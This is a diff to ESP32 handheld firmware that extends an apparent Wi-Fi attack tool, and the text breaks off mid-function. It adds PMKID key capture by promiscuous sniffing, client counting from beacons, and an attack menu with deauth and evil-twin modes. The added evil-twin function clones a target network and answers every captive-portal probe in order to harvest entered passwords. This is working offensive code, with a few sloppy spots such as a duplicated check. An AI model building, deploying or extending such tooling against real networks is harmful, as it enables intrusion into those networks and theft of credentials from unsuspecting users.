@@ -470,6 +470,7 @@ enum MenuState {
   BEACON_ADD,
   CAPTURED_PASSWORDS,
   HANDSHAKE_CAPTURE,
+  PMKID_CAPTURE,
   BLE_MENU,
   BLE_SCAN_RESULTS,
   BLE_JAM_MENU,
@@ -662,6 +663,8 @@ struct NetworkInfo {
   bool isEncrypted;
   unsigned long lastSeen;
   bool isNew;
+  uint8_t estimatedClients; 
+  bool hasClients;  
 };
 
 NetworkInfo networks[50];
@@ -812,6 +815,11 @@ struct ProbeTest {
 ProbeTest probeTests[5];
 int probeTestIndex = 0;
 
+// ==================== PMKID CAPTURE ====================
+bool pmkidCaptured = false;
+uint8_t capturedPMKID[16];
+uint8_t pmkidAPMAC[6];
+
 // ==================== SCREEN SIZE ====================
 #define SCREEN_WIDTH 240
 #define SCREEN_HEIGHT 320
@@ -902,6 +910,82 @@ void drawCenteredButton(const char* text, uint16_t color = COLOR_RED, int y = 30
   
   tft.setCursor(x, y + 3);
   tft.print(text);
+}
+
+// ==================== Beacon callback for client detection ====================
+void IRAM_ATTR clientDetectionCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
+  
+  if (type != WIFI_PKT_MGMT) return;
+  
+  uint8_t frameType = pkt->payload[0];
+  uint8_t frameSubtype = (frameType & 0xF0) >> 4;
+  
+  // Only process Beacon frames (0x08)
+  if (frameSubtype != 0x08) return;
+  
+  // Extract BSSID
+  uint8_t bssid[6];
+  memcpy(bssid, &pkt->payload[16], 6);
+  
+  // Find matching network in our list
+  int netIdx = -1;
+  for (int i = 0; i < networkCount; i++) {
+    if (memcmp(networks[i].bssid, bssid, 6) == 0) {
+      netIdx = i;
+      break;
+    }
+  }
+  
+  if (netIdx == -1) return;
+  
+  // Parse beacon frame for TIM element (Traffic Indication Map)
+  // TIM shows which associated clients have buffered data
+  int offset = 36; // Start after fixed beacon fields
+  
+  uint8_t clientCount = 0;
+  bool foundTIM = false;
+  
+  while (offset < pkt->rx_ctrl.sig_len - 2) {
+    uint8_t tagNum = pkt->payload[offset];
+    uint8_t tagLen = pkt->payload[offset + 1];
+    
+    if (tagLen == 0 || offset + 2 + tagLen > pkt->rx_ctrl.sig_len) break;
+    
+    // TIM element (tag 0x05)
+    if (tagNum == 0x05 && tagLen >= 4) {
+      foundTIM = true;
+      
+      // TIM structure:
+      // [DTIM Count][DTIM Period][Bitmap Control][Partial Virtual Bitmap...]
+      uint8_t bitmapControl = pkt->payload[offset + 4];
+      
+      // Count set bits in bitmap (each bit = potential client)
+      for (int i = 0; i < tagLen - 3; i++) {
+        uint8_t byte = pkt->payload[offset + 5 + i];
+        // Count bits set
+        while (byte) {
+          clientCount += byte & 1;
+          byte >>= 1;
+        }
+      }
+      
+      // Bitmap Control byte also indicates clients
+      if (bitmapControl > 0) {
+        clientCount++;
+      }
+      
+      break;
+    }
+    
+    offset += 2 + tagLen;
+  }
+  
+  // Update network info
+  if (foundTIM) {
+    networks[netIdx].estimatedClients = clientCount;
+    networks[netIdx].hasClients = (clientCount > 0);
+  }
 }
 
 // ==================== KARMA DETECTOR CALLBACK ====================
@@ -4335,6 +4419,12 @@ void startContinuousWiFiScan() {
   continuousWiFiScan = true;
   wifiScrollOffset = 0;
   
+  // Reset client counts
+  for (int i = 0; i < networkCount; i++) {
+    networks[i].estimatedClients = 0;
+    networks[i].hasClients = false;
+  }
+  
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
   delay(100);
@@ -4342,8 +4432,12 @@ void startContinuousWiFiScan() {
   currentState = WIFI_SCAN;
   addToConsole("Continuous scan started");
   
-  // Start async scan
+  // Start standard scan
   WiFi.scanNetworks(true, false, false, 300);
+  
+  // ALSO enable promiscuous mode for client detection
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(&clientDetectionCallback);
   
   displayContinuousWiFiScan();
 }
@@ -4429,14 +4523,18 @@ void displayWiFiScanResults() {
 void displayContinuousWiFiScan() {
   static unsigned long lastUpdate = 0;
   
-  // Only update display every 500ms to reduce flicker
   if (millis() - lastUpdate < 500) return;
   lastUpdate = millis();
   
   tft.fillScreen(COLOR_BG);
   drawTerminalHeader("wifi scan");
   
-  // Status line
+  // Live indicator
+  static bool blink = false;
+  blink = !blink;
+  tft.fillCircle(220, 12, 3, blink ? COLOR_GREEN : COLOR_DARK_GREEN);
+  
+  // Stats bar
   tft.setTextSize(1);
   tft.setTextColor(COLOR_CYAN);
   tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 5);
@@ -4448,7 +4546,7 @@ void displayContinuousWiFiScan() {
   tft.setTextColor(COLOR_GREEN);
   tft.printf("%d", networkCount);
   
-  // Column headers
+  // Column headers - UPDATED with CLIENT column
   int listY = HEADER_HEIGHT + 20;
   tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
   
@@ -4456,23 +4554,23 @@ void displayContinuousWiFiScan() {
   tft.setTextColor(COLOR_DARK_GREEN);
   tft.setCursor(SIDE_MARGIN, listY);
   tft.print("SSID");
-  tft.setCursor(120, listY);
+  tft.setCursor(100, listY);  // ← Moved left
   tft.print("CH");
-  tft.setCursor(145, listY);
+  tft.setCursor(125, listY);  // ← Moved left
   tft.print("PWR");
-  tft.setCursor(180, listY);
+  tft.setCursor(160, listY);  // ← Moved left
   tft.print("SEC");
+  tft.setCursor(200, listY);  // ← NEW
+  tft.print("CL");  // Clients
   
   tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
   listY += 15;
   
-  // Calculate safe display area (stop before back button)
   const int BACK_BUTTON_Y = 305;
-  const int SAFE_BOTTOM = BACK_BUTTON_Y - 25; // Safe margin
+  const int SAFE_BOTTOM = BACK_BUTTON_Y - 25;
   const int ITEM_HEIGHT = 22;
   const int MAX_ITEMS = (SAFE_BOTTOM - listY) / ITEM_HEIGHT;
   
-  // Ensure scroll offset is valid
   if (wifiScrollOffset >= networkCount) {
     wifiScrollOffset = max(0, networkCount - MAX_ITEMS);
   }
@@ -4486,10 +4584,8 @@ void displayContinuousWiFiScan() {
     int idx = wifiScrollOffset + i;
     int y = listY + (i * ITEM_HEIGHT);
     
-    // Stop if too close to back button
     if (y + ITEM_HEIGHT > SAFE_BOTTOM) break;
     
-    // Highlight if hovered
     if (hoveredIndex == i) {
       tft.fillRect(0, y - 2, 240, ITEM_HEIGHT, COLOR_HOVER_BG);
     }
@@ -4501,10 +4597,10 @@ void displayContinuousWiFiScan() {
       tft.print("*");
     }
     
-    // SSID (truncate if too long)
+    // SSID (shortened to fit CLIENT column)
     String displaySSID = networks[idx].ssid;
     if (displaySSID.length() == 0) displaySSID = "<hidden>";
-    if (displaySSID.length() > 15) displaySSID = displaySSID.substring(0, 14) + "~";
+    if (displaySSID.length() > 12) displaySSID = displaySSID.substring(0, 11) + "~";  // ← Reduced from 15
     
     tft.setTextColor(hoveredIndex == i ? COLOR_WHITE : COLOR_TEXT);
     tft.setTextSize(1);
@@ -4513,10 +4609,10 @@ void displayContinuousWiFiScan() {
     
     // Channel
     tft.setTextColor(COLOR_CYAN);
-    tft.setCursor(120, y + 5);
+    tft.setCursor(100, y + 5);
     tft.printf("%2d", networks[idx].channel);
     
-    // Signal strength (color coded)
+    // Signal strength
     int rssi = networks[idx].rssi;
     uint16_t signalColor;
     if (rssi > -50) signalColor = COLOR_GREEN;
@@ -4524,31 +4620,45 @@ void displayContinuousWiFiScan() {
     else signalColor = COLOR_RED;
     
     tft.setTextColor(signalColor);
-    tft.setCursor(145, y + 5);
+    tft.setCursor(125, y + 5);
     tft.printf("%3d", rssi);
     
     // Security
     tft.setTextColor(networks[idx].isEncrypted ? COLOR_RED : COLOR_GREEN);
-    tft.setCursor(180, y + 5);
-    tft.print(networks[idx].isEncrypted ? "WPA" : "OPEN");
+    tft.setCursor(160, y + 5);
+    tft.print(networks[idx].isEncrypted ? "WPA" : "OPN");
+    
+    // ← NEW: Client count
+    if (networks[idx].hasClients) {
+      tft.setTextColor(COLOR_ORANGE);
+      tft.setCursor(200, y + 5);
+      if (networks[idx].estimatedClients > 0) {
+        tft.printf("%2d", networks[idx].estimatedClients);
+      } else {
+        tft.print("âœ");  // Checkmark if clients detected but count unknown
+      }
+    } else {
+      tft.setTextColor(COLOR_DARK_GREEN);
+      tft.setCursor(200, y + 5);
+      tft.print(" -");
+    }
   }
   
-  // Scroll indicator (if needed)
+  // Scroll indicator
   if (networkCount > MAX_ITEMS) {
-  int scrollY = SAFE_BOTTOM + 2;
-  tft.setTextColor(COLOR_DARK_GREEN);
-  tft.setTextSize(1);
-  
-  // Calculate text width: each char = 6px in size 1
-  int currentPage = (wifiScrollOffset / MAX_ITEMS) + 1;
-  int totalPages = (networkCount + MAX_ITEMS - 1) / MAX_ITEMS;
-  char scrollText[30];
-  sprintf(scrollText, "Page %d/%d [Tap scroll]", currentPage, totalPages);
-  int textWidth = strlen(scrollText) * 6;
-  int centerX = (240 - textWidth) / 2;
-  
-  tft.setCursor(centerX, scrollY);
-  tft.print(scrollText);
+    int scrollY = SAFE_BOTTOM + 2;
+    tft.setTextColor(COLOR_DARK_GREEN);
+    tft.setTextSize(1);
+    
+    int currentPage = (wifiScrollOffset / MAX_ITEMS) + 1;
+    int totalPages = (networkCount + MAX_ITEMS - 1) / MAX_ITEMS;
+    char scrollText[30];
+    sprintf(scrollText, "Page %d/%d [Tap]", currentPage, totalPages);
+    int textWidth = strlen(scrollText) * 6;
+    int centerX = (240 - textWidth) / 2;
+    
+    tft.setCursor(centerX, scrollY);
+    tft.print(scrollText);
   }
   
   drawCenteredButton("[ESC]", COLOR_RED);
@@ -6487,30 +6597,126 @@ void drawAttackMenu() {
   if (displaySSID.length() > 22) displaySSID = displaySSID.substring(0, 21) + "~";
   tft.println(displaySSID);
   
-  // 6 MENU ITEMS
+  // ✅ FIXED: 8 MENU ITEMS with PERFECT spacing
   const char* menuItems[] = {
-    "Deauth (Standard)",
-    "Deauth (Storm)",
+    "Deauth (Passive)",
+    "Deauth (Aggressive)", 
+    "Evil Twin (Passive)",
+    "Evil Twin (Aggressive)",
     "Capture Handshake",
-    "Evil Twin",
+    "Capture PMKID",
     "View Passwords",
     "Stop All"
   };
   
-  int y = HEADER_HEIGHT + 25;
-  for (int i = 0; i < 6; i++) {
+  int menuStartY = HEADER_HEIGHT + 25;
+  const int ITEM_SPACING = 24;  // Even spacing for all items
+  
+  for (int i = 0; i < 8; i++) {
+    int y = menuStartY + (i * ITEM_SPACING);
     drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
-    y += MENU_ITEM_HEIGHT + MENU_SPACING;
+    
+    // ✅ FIXED: <Active> indicators - PERFECTLY ALIGNED at x=168
+    bool showActive = false;
+    if (i == 0 && deauthActive && currentDeauthMethod == 0) showActive = true;
+    if (i == 1 && deauthActive && currentDeauthMethod == 1) showActive = true;
+    if (i == 2 && portalActive && !deauthActive) showActive = true;
+    if (i == 3 && portalActive && deauthActive) showActive = true;
+    if (i == 4 && currentState == HANDSHAKE_CAPTURE) showActive = true;
+    if (i == 5 && currentState == PMKID_CAPTURE) showActive = true;
+    
+    if (showActive) {
+      // Clear area first (prevents overlap)
+      tft.fillRect(168, y + 5, 72, 14, COLOR_BG);
+      
+      tft.setTextColor(COLOR_ORANGE);
+      tft.setTextSize(1);
+      tft.setCursor(170, y + 7);  // x=170 for perfect alignment
+      tft.print("<Active>");
+    }
   }
   
-  // === SEPARATOR LINE ===
-  int separatorY = y + 5;
+  // === STATUS SECTION - Starts AFTER menu items ===
+  int separatorY = menuStartY + (8 * ITEM_SPACING) + 3;
   tft.drawFastHLine(0, separatorY, 240, COLOR_DARK_GREEN);
   
-  // === STATUS SECTION REMOVED ===
-  // updateAttackMenuLive() will handle all status drawing to prevent overlap
+  int statusY = separatorY + 6;
+  int leftColX = SIDE_MARGIN;
+  int rightColX = 130;
   
-    drawCenteredButton("[ESC]", COLOR_RED);
+  // ===== LEFT COLUMN STATUS =====
+  tft.setTextSize(1);
+  
+  // Deauth status
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(leftColX, statusY);
+  tft.print("Deauth:");
+  tft.setCursor(leftColX + 48, statusY);
+  tft.setTextColor(deauthActive ? COLOR_ORANGE : COLOR_TEXT);
+  tft.print(deauthActive ? "ACTIVE" : "OFF   ");
+  
+  // Portal status
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(leftColX, statusY + 11);
+  tft.print("Portal:");
+  tft.setCursor(leftColX + 48, statusY + 11);
+  tft.setTextColor(portalActive ? COLOR_ORANGE : COLOR_TEXT);
+  tft.print(portalActive ? "ACTIVE" : "OFF   ");
+  
+  // Handshake status
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(leftColX, statusY + 22);
+  tft.print("Handshake:");
+  tft.setCursor(leftColX + 60, statusY + 22);
+  if (capturedHandshake.captured) {
+    tft.setTextColor(COLOR_GREEN);
+    tft.print("YES");
+  } else {
+    tft.setTextColor(COLOR_TEXT);
+    tft.print("NO ");
+  }
+  
+  // Passwords count
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(leftColX, statusY + 33);
+  tft.print("Passwords:");
+  tft.setCursor(leftColX + 60, statusY + 33);
+  tft.setTextColor(COLOR_CYAN);
+  tft.printf("%-3d", capturedCredCount);
+  
+  // ===== RIGHT COLUMN - Active attack details =====
+  if (deauthActive) {
+    // Packets sent
+    tft.setTextColor(COLOR_DARK_GREEN);
+    tft.setCursor(rightColX, statusY);
+    tft.print("Packets:");
+    tft.setCursor(rightColX, statusY + 11);
+    tft.setTextColor(COLOR_ORANGE);
+    tft.printf("%-8d", deauthPacketsSent);
+    
+    // Method
+    tft.setTextColor(COLOR_DARK_GREEN);
+    tft.setCursor(rightColX, statusY + 22);
+    tft.print("Method:");
+    tft.setTextColor(COLOR_CYAN);
+    tft.setCursor(rightColX + 42, statusY + 22);
+    tft.print(currentDeauthMethod == 0 ? "Standard" : "Storm   ");
+  }
+  
+  if (portalActive) {
+    // Clients count
+    int portalY = deauthActive ? statusY + 33 : statusY;
+    tft.setTextColor(COLOR_DARK_GREEN);
+    tft.setCursor(rightColX, portalY);
+    tft.print("Clients:");
+    
+    int clientCount = WiFi.softAPgetStationNum();
+    tft.setTextColor(clientCount > 0 ? COLOR_GREEN : COLOR_TEXT);
+    tft.setCursor(rightColX + 48, portalY);
+    tft.printf("%-2d", clientCount);
+  }
+  
+  drawCenteredButton("[ESC]", COLOR_RED);
 }
 
 void drawSpamMenu() {
@@ -6942,6 +7148,16 @@ void handleTouch() {
         currentState = WIFI_MENU;
         drawWiFiMenu();
         break;
+
+      case PMKID_CAPTURE:
+        // PMKID capture back button
+        if (touchY > 300) {
+          esp_wifi_set_promiscuous(false);
+          currentState = WIFI_ATTACK_MENU;
+          hoveredIndex = -1;
+          drawAttackMenu();
+        }
+        break;
         
       case SNIFFER_ACTIVE:
         Serial.println("\n[!] ===== SNIFFER STOP INITIATED =====");
@@ -6956,11 +7172,13 @@ void handleTouch() {
         return;
         
       case HANDSHAKE_CAPTURE:
-        // Just stop, don't redraw yet
-        stopDeauth();
-        esp_wifi_set_promiscuous(false);
-        currentState = WIFI_ATTACK_MENU;
-        drawAttackMenu();
+        if (touchY > 300) {
+          if (deauthActive) deauthActive = false;
+          esp_wifi_set_promiscuous(false);
+          currentState = WIFI_ATTACK_MENU;
+          hoveredIndex = -1;
+          drawAttackMenu();
+        }
         break;
         
       case CAPTURED_PASSWORDS:
@@ -7916,6 +8134,7 @@ void handleWiFiScanTouch(int x, int y) {
   if (y > 300) {
     continuousWiFiScan = false;
     WiFi.scanDelete();
+    esp_wifi_set_promiscuous(false);  // ← NEW: Stop promiscuous mode
     currentState = WIFI_MENU;
     hoveredIndex = -1;
     drawWiFiMenu();
@@ -7928,7 +8147,6 @@ void handleWiFiScanTouch(int x, int y) {
   const int ITEM_HEIGHT = 22;
   const int MAX_ITEMS = (SAFE_BOTTOM - listY) / ITEM_HEIGHT;
   
-  // Check if touch is in list area
   if (y >= listY && y < SAFE_BOTTOM) {
     int clickedIndex = (y - listY) / ITEM_HEIGHT;
     int actualIndex = wifiScrollOffset + clickedIndex;
@@ -7938,16 +8156,16 @@ void handleWiFiScanTouch(int x, int y) {
       selectedIndex = actualIndex;
       continuousWiFiScan = false;
       WiFi.scanDelete();
+      esp_wifi_set_promiscuous(false);  // ← NEW: Stop promiscuous mode
       currentState = WIFI_ATTACK_MENU;
       drawAttackMenu();
       addToConsole("Target: " + selectedSSID);
     }
   }
-  // Scroll functionality - tap scroll indicator area
   else if (y >= SAFE_BOTTOM && y < 300 && networkCount > MAX_ITEMS) {
     wifiScrollOffset += MAX_ITEMS;
     if (wifiScrollOffset >= networkCount) {
-      wifiScrollOffset = 0; // Wrap to start
+      wifiScrollOffset = 0;
     }
     displayContinuousWiFiScan();
   }
@@ -7960,24 +8178,29 @@ void handleAttackMenuTouch(int x, int y) {
     if (currentState == HANDSHAKE_CAPTURE) {
       esp_wifi_set_promiscuous(false);
     }
+    if (currentState == PMKID_CAPTURE) {
+      esp_wifi_set_promiscuous(false);
+    }
     currentState = WIFI_MENU;
     hoveredIndex = -1;
     drawWiFiMenu();
     return;
   }
   
+  // ✅ FIXED: Touch detection with EXACT spacing match
   int startY = HEADER_HEIGHT + 25;
+  const int ITEM_SPACING = 24;  // MUST match drawAttackMenu()
   
-  if (y >= startY && y < startY + (6 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
+  if (y >= startY && y < startY + (8 * ITEM_SPACING)) {
     int relativeY = y - startY;
-    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
+    int buttonIndex = relativeY / ITEM_SPACING;
     
-    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
+    int buttonY = startY + (buttonIndex * ITEM_SPACING);
     if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
       switch (buttonIndex) {
-        case 0:
+        case 0: // Deauth (Passive)
           if (portalActive) stopCaptivePortal();
-          if (currentState == HANDSHAKE_CAPTURE) {
+          if (currentState == HANDSHAKE_CAPTURE || currentState == PMKID_CAPTURE) {
             esp_wifi_set_promiscuous(false);
             currentState = WIFI_ATTACK_MENU;
           }
@@ -7987,9 +8210,9 @@ void handleAttackMenuTouch(int x, int y) {
           drawAttackMenu();
           break;
           
-        case 1:
+        case 1: // Deauth (Aggressive)
           if (portalActive) stopCaptivePortal();
-          if (currentState == HANDSHAKE_CAPTURE) {
+          if (currentState == HANDSHAKE_CAPTURE || currentState == PMKID_CAPTURE) {
             esp_wifi_set_promiscuous(false);
             currentState = WIFI_ATTACK_MENU;
           }
@@ -7999,33 +8222,431 @@ void handleAttackMenuTouch(int x, int y) {
           drawAttackMenu();
           break;
           
-        case 2:
-          lastAttackTime = millis();
-          startHandshakeCapture();
+        case 2: // Evil Twin (Passive)
+          startEvilTwinPassive();
+          drawAttackMenu();
           break;
           
-        case 3:
+        case 3: // Evil Twin (Aggressive)
           startEvilTwin();
           drawAttackMenu();
           break;
           
-        case 4:
+        case 4: // Capture Handshake
+          lastAttackTime = millis();
+          startHandshakeCapture();
+          break;
+          
+        case 5: // Capture PMKID
+          lastAttackTime = millis();
+          startPMKIDCapture();
+          break;
+          
+        case 6: // View Passwords
           credDisplayOffset = 0;
           displayCapturedPasswords();
           break;
           
-        case 5:
-          stopDeauth();
-          if (portalActive) stopCaptivePortal();
-          if (currentState == HANDSHAKE_CAPTURE) {
+        case 7: // Stop All
+          if (deauthActive) {
+            deauthActive = false;
+          }
+          if (portalActive) {
+            stopCaptivePortal();
+          }
+          if (currentState == HANDSHAKE_CAPTURE || currentState == PMKID_CAPTURE) {
             esp_wifi_set_promiscuous(false);
             currentState = WIFI_ATTACK_MENU;
           }
+          delay(200);
           drawAttackMenu();
           break;
       }
     }
   }
+}
+
+void startEvilTwinPassive() {
+  if (deauthActive) {
+    deauthActive = false;
+    Serial.println("[*] Deauth disabled for passive mode");
+  }
+  
+  if (selectedSSID.length() == 0 || networkCount == 0) {
+    addToConsole("ERROR: No target");
+    return;
+  }
+  if (selectedSSID.length() == 0 || networkCount == 0) {
+    addToConsole("ERROR: No target");
+    return;
+  }
+  
+  int targetIndex = -1;
+  for (int i = 0; i < networkCount; i++) {
+    if (networks[i].ssid == selectedSSID) {
+      targetIndex = i;
+      break;
+    }
+  }
+  
+  if (targetIndex == -1) {
+    addToConsole("ERROR: Target not found");
+    return;
+  }
+  
+  Serial.println("\n[*] Starting PASSIVE Evil Twin (No Deauth)...");
+  
+  // Stop conflicting operations (but NO deauth)
+  if (snifferActive) {
+    stopSniffer();
+    delay(200);
+  }
+  if (beaconFloodActive) {
+    beaconFloodActive = false;
+    delay(100);
+  }
+  if (currentState == HANDSHAKE_CAPTURE || currentState == PMKID_CAPTURE) {
+    esp_wifi_set_promiscuous(false);
+    delay(100);
+  }
+  
+  // WiFi setup (same as aggressive)
+  WiFi.disconnect(true);
+  WiFi.mode(WIFI_OFF);
+  delay(500);
+  esp_task_wdt_reset();
+  
+  esp_wifi_stop();
+  delay(200);
+  esp_wifi_deinit();
+  delay(200);
+  
+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg);
+  delay(200);
+  
+  esp_wifi_set_mode(WIFI_MODE_AP);
+  delay(200);
+  esp_wifi_start();
+  delay(200);
+  esp_task_wdt_reset();
+  
+  // Configure AP
+  wifi_config_t ap_config = {};
+  strncpy((char*)ap_config.ap.ssid, selectedSSID.c_str(), 32);
+  ap_config.ap.ssid_len = selectedSSID.length();
+  ap_config.ap.channel = networks[targetIndex].channel;
+  
+  if (networks[targetIndex].isEncrypted) {
+    ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
+    strcpy((char*)ap_config.ap.password, "dummypass123");
+  } else {
+    ap_config.ap.authmode = WIFI_AUTH_OPEN;
+  }
+  
+  ap_config.ap.max_connection = 10;
+  ap_config.ap.beacon_interval = 100;
+  ap_config.ap.ssid_hidden = 0;
+  
+  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+  delay(200);
+  
+  WiFi.softAP(selectedSSID.c_str());
+  delay(500);
+  esp_task_wdt_reset();
+  
+  esp_wifi_set_max_tx_power(84);
+  
+  for (int i = 0; i < 3; i++) {
+    esp_wifi_set_channel(networks[targetIndex].channel, WIFI_SECOND_CHAN_NONE);
+    delay(50);
+  }
+  
+  IPAddress apIP = WiFi.softAPIP();
+  Serial.printf("[+] PASSIVE Evil Twin started (NO DEAUTH)\n");
+  Serial.printf("    SSID: %s\n", selectedSSID.c_str());
+  Serial.printf("    Channel: %d\n", networks[targetIndex].channel);
+  Serial.printf("    IP: %s\n", apIP.toString().c_str());
+  
+  // NO DEAUTH!
+  deauthActive = false;
+  portalActive = true;
+  
+  // DNS + Web server setup (same as aggressive)
+  dnsServer.stop();
+  delay(100);
+  dnsServer.start(53, "*", apIP);
+  
+  webServer.stop();
+  delay(100);
+  
+  webServer.on("/", HTTP_GET, handlePortalRoot);
+  webServer.on("/post", HTTP_POST, handlePortalPost);
+  webServer.on("/generate_204", HTTP_GET, handlePortalRoot);
+  webServer.on("/gen_204", HTTP_GET, handlePortalRoot);
+  webServer.on("/ncsi.txt", HTTP_GET, handlePortalRoot);
+  webServer.on("/hotspot-detect.html", HTTP_GET, handlePortalRoot);
+  webServer.on("/library/test/success.html", HTTP_GET, handlePortalRoot);
+  webServer.on("/captive", HTTP_GET, handlePortalRoot);
+  webServer.on("/connecttest.txt", HTTP_GET, handlePortalRoot);
+  webServer.on("/redirect", HTTP_GET, handlePortalRoot);
+  webServer.on("/msftconnecttest/connecttest.txt", HTTP_GET, handlePortalRoot);
+  webServer.on("/canonical.html", HTTP_GET, handlePortalRoot);
+  webServer.on("/success.txt", HTTP_GET, handlePortalRoot);
+  webServer.on("/status", HTTP_GET, handlePortalRoot);
+  webServer.on("/chat", HTTP_GET, handlePortalRoot);
+  webServer.onNotFound(handlePortalRoot);
+  
+  webServer.begin();
+  
+  Serial.println("[+] PASSIVE MODE ACTIVE");
+  Serial.println("    No deauth - waiting for natural connections");
+  
+  addToConsole("Evil Twin: PASSIVE");
+}
+
+void IRAM_ATTR pmkidSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
+  
+  if (type != WIFI_PKT_MGMT) return;
+  
+  uint8_t frameType = pkt->payload[0];
+  uint8_t frameSubtype = (frameType & 0xF0) >> 4;
+  
+  // Look for Beacon frames (0x08) or Association Response (0x01)
+  if (frameSubtype == 0x08 || frameSubtype == 0x01) {
+    
+    // Extract BSSID
+    uint8_t bssid[6];
+    memcpy(bssid, &pkt->payload[16], 6);
+    
+    // Search for RSN Information Element (tag 0x30)
+    int offset = (frameSubtype == 0x08) ? 36 : 28;
+    
+    while (offset < pkt->rx_ctrl.sig_len - 2) {
+      uint8_t tagNum = pkt->payload[offset];
+      uint8_t tagLen = pkt->payload[offset + 1];
+      
+      if (tagLen == 0 || offset + 2 + tagLen > pkt->rx_ctrl.sig_len) break;
+      
+      // RSN Information Element
+      if (tagNum == 0x30 && tagLen >= 20) {
+        // Search for PMKID (Key Data OUI: 00-0F-AC, Type: 04)
+        for (int i = 0; i < tagLen - 20; i++) {
+          if (pkt->payload[offset + 2 + i] == 0x00 &&
+              pkt->payload[offset + 2 + i + 1] == 0x0F &&
+              pkt->payload[offset + 2 + i + 2] == 0xAC &&
+              pkt->payload[offset + 2 + i + 3] == 0x04) {
+            
+            // Found PMKID! Extract it (16 bytes after the OUI+Type)
+            if (offset + 2 + i + 4 + 16 <= pkt->rx_ctrl.sig_len) {
+              memcpy(capturedPMKID, &pkt->payload[offset + 2 + i + 4], 16);
+              memcpy(pmkidAPMAC, bssid, 6);
+              pmkidCaptured = true;
+              
+              Serial.println("\n[+] PMKID CAPTURED!");
+              Serial.print("    PMKID: ");
+              for (int j = 0; j < 16; j++) {
+                Serial.printf("%02X", capturedPMKID[j]);
+              }
+              Serial.println();
+              
+              return;
+            }
+          }
+        }
+      }
+      
+      offset += 2 + tagLen;
+    }
+  }
+}
+
+void startPMKIDCapture() {
+  if (selectedSSID.length() == 0 || networkCount == 0) {
+    showMessage("No target selected!", COLOR_WARNING);
+    return;
+  }
+  
+  int targetIndex = -1;
+  for (int i = 0; i < networkCount; i++) {
+    if (networks[i].ssid == selectedSSID) {
+      targetIndex = i;
+      break;
+    }
+  }
+  
+  if (targetIndex == -1) return;
+  
+  // Reset PMKID
+  pmkidCaptured = false;
+  memset(capturedPMKID, 0, 16);
+  memset(pmkidAPMAC, 0, 6);
+  
+  // Stop conflicting operations
+  if (portalActive) stopCaptivePortal();
+  if (beaconFloodActive) beaconFloodActive = false;
+  
+  // Set up promiscuous mode
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  delay(100);
+  
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(&pmkidSnifferCallback);
+  esp_wifi_set_channel(networks[targetIndex].channel, WIFI_SECOND_CHAN_NONE);
+  
+  currentState = PMKID_CAPTURE;
+  
+  Serial.printf("[*] PMKID capture mode on %s (Ch %d)\n", 
+                selectedSSID.c_str(), 
+                networks[targetIndex].channel);
+  
+  addToConsole("Capturing PMKID...");
+  displayPMKIDCapture();
+}
+
+void displayPMKIDCapture() {
+  tft.fillScreen(COLOR_BG);
+  drawTerminalHeader("pmkid capture");
+  
+  // Live indicator
+  static bool blink = false;
+  blink = !blink;
+  tft.fillCircle(220, 12, 3, blink ? COLOR_PURPLE : COLOR_DARK_GREEN);
+  
+  int y = HEADER_HEIGHT + 10;
+  
+  // Target info
+  tft.setTextSize(1);
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.print("Target: ");
+  tft.setTextColor(COLOR_YELLOW);
+  String truncSSID = selectedSSID;
+  if (truncSSID.length() > 18) truncSSID = truncSSID.substring(0, 17) + "~";
+  tft.print(truncSSID);
+  
+  int targetIndex = -1;
+  for (int i = 0; i < networkCount; i++) {
+    if (networks[i].ssid == selectedSSID) {
+      targetIndex = i;
+      break;
+    }
+  }
+  
+  if (targetIndex != -1) {
+    tft.setTextColor(COLOR_DARK_GREEN);
+    tft.print(" Ch");
+    tft.setTextColor(COLOR_CYAN);
+    tft.printf("%d", networks[targetIndex].channel);
+  }
+  
+  y += 18;
+  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
+  y += 8;
+  
+  // PMKID status
+  tft.setTextColor(COLOR_TEXT);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.print("PMKID: ");
+  
+  if (pmkidCaptured) {
+    static unsigned long captureBlinkTime = 0;
+    static bool captureBlinkState = false;
+    
+    if (captureBlinkTime == 0) {
+      captureBlinkTime = millis();
+      captureBlinkState = true;
+    }
+    
+    bool showText = true;
+    if (millis() - captureBlinkTime < 5000) {
+      if (millis() / 200 % 2 == 0) {
+        showText = true;
+      } else {
+        showText = false;
+      }
+    } else {
+      showText = true;
+    }
+    
+    if (showText) {
+      tft.setTextColor(COLOR_GREEN);
+      tft.print("CAPTURED!");
+    }
+    
+    y += 20;
+    tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
+    y += 8;
+    
+    // AP MAC
+    tft.setTextColor(COLOR_DARK_GREEN);
+    tft.setCursor(SIDE_MARGIN, y);
+    tft.print("AP:");
+    tft.setTextColor(COLOR_CYAN);
+    tft.setCursor(30, y);
+    tft.printf("%02X:%02X:%02X:%02X:%02X:%02X", 
+               pmkidAPMAC[0], pmkidAPMAC[1],
